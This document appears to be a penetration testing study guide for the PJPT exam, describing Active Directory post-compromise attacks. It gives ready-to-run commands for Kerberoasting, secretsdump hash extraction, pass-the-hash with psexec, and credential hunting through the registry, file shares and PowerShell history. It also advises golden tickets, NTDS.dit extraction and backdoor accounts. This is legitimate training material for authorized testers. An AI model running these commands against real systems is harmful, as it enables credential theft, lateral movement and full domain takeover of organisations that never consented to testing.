# Post-Compromise Attack Strategy

## Overview
Once you've gained initial access to a domain environment, the real work begins. This guide outlines a systematic approach to post-compromise activities, focusing on privilege escalation, lateral movement, and achieving persistent domain access.

## The Question: "We have an account, now what?"

After successfully compromising an account (through password spraying, phishing, or other initial access methods), you need a structured approach to maximize the compromise and achieve your penetration testing objectives.

## Phase 1: Search the Quick Wins

### 1. Kerberoasting
**Goal**: Extract service account passwords that can be cracked offline

```bash
# Using GetUserSPNs.py (Impacket)
GetUserSPNs.py domain.local/username:password -dc-ip dc_ip -request

# Using Rubeus (if you have a Windows session)
Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt

# Crack the hashes
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# Expected outcomes:
# - Service account passwords
# - Potential admin-level accounts
# - Lateral movement opportunities
```

### 2. Secretsdump
**Goal**: Extract password hashes and secrets from accessible systems

```bash
# Basic secretsdump against domain controller
secretsdump.py domain.local/username:password@dc.domain.local

# Target specific systems where you have admin rights
secretsdump.py domain.local/username:password@target_server.domain.local

# Use extracted hashes for further attacks
secretsdump.py -hashes :ntlm_hash domain.local/username@target

# What to look for:
# - Administrator account hashes
# - Machine account hashes
# - Cached credentials
# - LSA secrets
```

### 3. Pass the Hash / Pass the Password
**Goal**: Use extracted credentials for lateral movement

```bash
# Pass-the-Hash with extracted NTLM hashes
psexec.py -hashes :ntlm_hash administrator@target_server.domain.local

# Pass-the-Password with cracked passwords
psexec.py domain.local/service_account:crackedpassword@target_server.domain.local

# Test credential validity across multiple systems
crackmapexec smb 192.168.1.0/24 -u username -p password
crackmapexec smb 192.168.1.0/24 -u username -H ntlm_hash

# Look for systems where you have admin rights
crackmapexec smb 192.168.1.0/24 -u username -p password --pwn3d
```

#### Quick Win Assessment Checklist
```bash
# ✅ Kerberoasting Results:
# - Did we find any crackable service account passwords?
# - Do any service accounts have admin rights?
# - Are there high-privilege service accounts (SQL, Exchange, etc.)?

# ✅ Secretsdump Results:
# - Did we extract domain admin hashes?
# - Are there any interesting machine accounts?
# - Did we find cached credentials for other users?

# ✅ Lateral Movement Results:
# - How many systems can we access with current credentials?
# - Do we have admin rights on any additional systems?
# - Can we access any servers (file servers, SQL servers, etc.)?
```

## Phase 2: No Quick Wins? Dig Deep!

### 1. Enumerate with Bloodhound
**Goal**: Map the domain environment and find privilege escalation paths

```bash
# Collect domain data with bloodhound-python
bloodhound-python -d domain.local -u username -p password -gc dc.domain.local -c all

# Alternative: Use SharpHound from a Windows system
.\SharpHound.exe -c All -d domain.local

# Upload data to Bloodhound and analyze:
# - Pre-built queries for privilege escalation
# - Custom queries for specific attack paths
# - Group membership analysis
# - Service account identification
```

#### Key Bloodhound Queries for Post-Compromise
```cypher
# Find shortest path to Domain Admins
MATCH (u:User {name:"USERNAME@DOMAIN.LOCAL"}), (g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}), p=shortestPath((u)-[*1..]->(g)) RETURN p

# Find computers where user has admin rights
MATCH (u:User {name:"USERNAME@DOMAIN.LOCAL"})-[:AdminTo]->(c:Computer) RETURN c.name

# Find kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames

# Find ASREPRoastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

# Find computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
```

### 2. Analyze Account Access
**Goal**: Understand where your compromised account has legitimate access

```bash
# Test SMB access across the domain
crackmapexec smb domain_ips.txt -u username -p password --shares

# Check specific services
crackmapexec mssql domain_ips.txt -u username -p password
crackmapexec winrm domain_ips.txt -u username -p password
crackmapexec rdp domain_ips.txt -u username -p password

# Enumerate file shares for sensitive data
smbmap -H target_ip -u username -p password -r

# Check group memberships
net user username /domain
net group "group_name" /domain
```

#### Access Analysis Questions
```bash
# 🔍 File Server Access:
# - Can we access file servers with sensitive data?
# - Are there backup files or configuration files?
# - Do we find additional credentials in files?

# 🔍 Application Server Access:
# - Can we access SQL servers, web servers, etc.?
# - Are there application-specific vulnerabilities?
# - Can we extract application credentials or data?

# 🔍 Management System Access:
# - Can we access SCCM, backup servers, monitoring systems?
# - Do we have access to virtualization platforms?
# - Are there management scripts with embedded credentials?
```

### 3. Old Vulnerabilities Die Hard
**Goal**: Look for unpatched systems and legacy vulnerabilities

```bash
# Scan for common Windows vulnerabilities
nmap --script vuln -p 445 target_range

# Check for specific CVEs
crackmapexec smb target_range -u username -p password --gen-relay-list relayable_hosts.txt

# Look for older Windows versions
crackmapexec smb target_range -u username -p password | grep -E "(Windows Server 2008|Windows 7|Windows Server 2012)"

# Check for unpatched systems
wmic qfe list brief /format:table
```

#### Common Legacy Vulnerabilities to Check
```bash
# MS17-010 (EternalBlue)
# MS14-068 (Kerberos checksum validation)
# MS15-014 (Group Policy SACL)
# PrintNightmare (CVE-2021-1675/CVE-2021-34527)
# Zerologon (CVE-2020-1472)
# PetitPotam (CVE-2021-36942)
```

## Phase 3: Think Outside the Box

### Creative Enumeration Techniques

#### 1. LDAP Enumeration for Hidden Information
```bash
# Enumerate interesting LDAP attributes
ldapsearch -x -H ldap://dc.domain.local -D "username@domain.local" -w password -b "DC=domain,DC=local" "(objectClass=user)" | grep -i description

# Look for accounts with interesting descriptions
ldapsearch -x -H ldap://dc.domain.local -D "username@domain.local" -w password -b "DC=domain,DC=local" "(&(objectClass=user)(description=*))" description sAMAccountName

# Find computers with specific operating systems
ldapsearch -x -H ldap://dc.domain.local -D "username@domain.local" -w password -b "DC=domain,DC=local" "(&(objectClass=computer)(operatingSystem=*))" operatingSystem dNSHostName
```

#### 2. Credential Hunting in Unexpected Places
```bash
# Search for credentials in file shares
findstr /si password *.txt *.xml *.config *.ini
findstr /si pass *.bat *.cmd *.ps1

# Look for PowerShell history
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# Check browser saved passwords
rundll32.exe keymgr.dll,KRShowKeyMgr

# Registry credential hunting
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

#### 3. Living Off The Land Techniques
```bash
# Use legitimate Windows tools for enumeration
wmic computersystem get domain
wmic group list brief
wmic useraccount list brief
wmic service list brief

# PowerShell AD enumeration without additional tools
Get-ADUser -Filter * -Properties Description | Where-Object {$_.Description -ne $null}
Get-ADComputer -Filter * -Properties OperatingSystem | Where-Object {$_.OperatingSystem -like "*Server 2008*"}
Get-ADGroup -Filter * | Select-Object Name,GroupScope,GroupCategory
```

## Strategic Decision Tree

### When Quick Wins Succeed
```bash
# ✅ If Kerberoasting yields admin accounts:
# → Use for immediate domain compromise
# → Extract krbtgt hash for Golden Tickets
# → Establish persistent access

# ✅ If Secretsdump yields domain admin hashes:
# → Pass-the-Hash to Domain Controller
# → Extract NTDS.dit for complete domain compromise
# → Create additional backdoor accounts

# ✅ If lateral movement finds admin access:
# → Deploy tools on multiple systems
# → Hunt for additional credentials
# → Look for sensitive data and systems
```

### When Deep Enumeration is Required
```bash
# 🔍 If Bloodhound shows delegation paths:
# → Target accounts with delegation rights
# → Look for S4U2Self/S4U2Proxy opportunities
# → Check for constrained/unconstrained delegation

# 🔍 If access analysis reveals interesting systems:
# → Focus on high-value targets (DCs, file servers)
# → Look for application-specific attacks
# → Hunt for backup systems and archives

# 🔍 If legacy vulnerabilities are found:
# → Exploit unpatched systems for SYSTEM access
# → Use compromised systems as pivot points
# → Extract additional credentials from memory
```

## Post-Compromise Methodology Summary

### Phase 1: Quick Assessment (15-30 minutes)
1. **Kerberoasting** - Look for weak service account passwords
2. **Secretsdump** - Extract hashes from accessible systems  
3. **Credential Testing** - Test extracted credentials across domain

### Phase 2: Deep Enumeration (1-2 hours)
1. **Bloodhound Analysis** - Map privilege escalation paths
2. **Access Mapping** - Understand account permissions and access
3. **Vulnerability Scanning** - Look for unpatched legacy systems

### Phase 3: Creative Approaches (Ongoing)
1. **LDAP Deep Dive** - Extract hidden information from AD
2. **Credential Hunting** - Search files and registry for passwords
3. **Living Off The Land** - Use legitimate tools for enumeration

## PJPT Exam Strategy

### Time Management for Post-Compromise
```bash
# First 30 minutes - Quick Wins:
# - Kerberoasting all service accounts
# - Secretsdump on accessible systems
# - Credential testing with crackmapexec

# Next 60 minutes - Deep Enumeration:
# - Bloodhound data collection and analysis
# - SMB enumeration across domain
# - Application-specific enumeration

# Remaining time - Exploitation and Documentation:
# - Target highest-impact attack paths
# - Establish persistent access
# - Document all findings and attack chains
```

### Documentation Priority
1. **Initial Access Vector** - How you gained the first account
2. **Quick Win Results** - What credentials/access you gained immediately
3. **Privilege Escalation Path** - Step-by-step path to domain admin
4. **Lateral Movement Evidence** - Systems accessed and methods used
5. **Persistence Mechanisms** - How you maintained access
6. **Impact Assessment** - What data/systems could be compromised

---

**Remember**: The goal is not just to get domain admin, but to demonstrate a complete understanding of the attack chain and the business impact of the compromise. Always think like an attacker but document like a professional penetration tester. 